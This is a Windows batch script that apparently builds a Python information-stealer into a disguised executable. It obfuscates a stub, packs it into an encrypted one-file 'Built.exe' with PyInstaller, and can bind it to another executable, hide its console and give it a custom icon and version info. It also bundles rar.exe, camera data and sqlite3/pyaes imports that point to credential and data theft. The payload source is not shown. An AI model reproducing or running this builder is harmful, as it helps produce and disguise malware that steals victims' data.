@echo off
cls
if not exist activate (
    echo venv not found
    pause
    exit
) else (
    call activate
)
cls
if not exist REQS (
    title Installing requirements...
    pip install -r requirements.txt
    type NUL > REQS
)
cls
title Obfuscating...
python process.py
title Converting to exe...
if exist "bound.exe" (set "bound=--add-binary bound.exe;.") else (set "bound=")
if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
set key=%random%%random%%random%%random%
set key=%key:~-16%
pyinstaller %mode% --onefile --clean --noconfirm stub-o.py --key %key% --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import json --add-data Camera;. --add-binary rar.exe;. --add-data rarreg.key;. --version-file version.txt %bound%
if %errorlevel%==0 (
    python postprocess.py
    explorer.exe dist
    exit
) else (
    color 4 && title ERROR
    pause > NUL
    exit
)
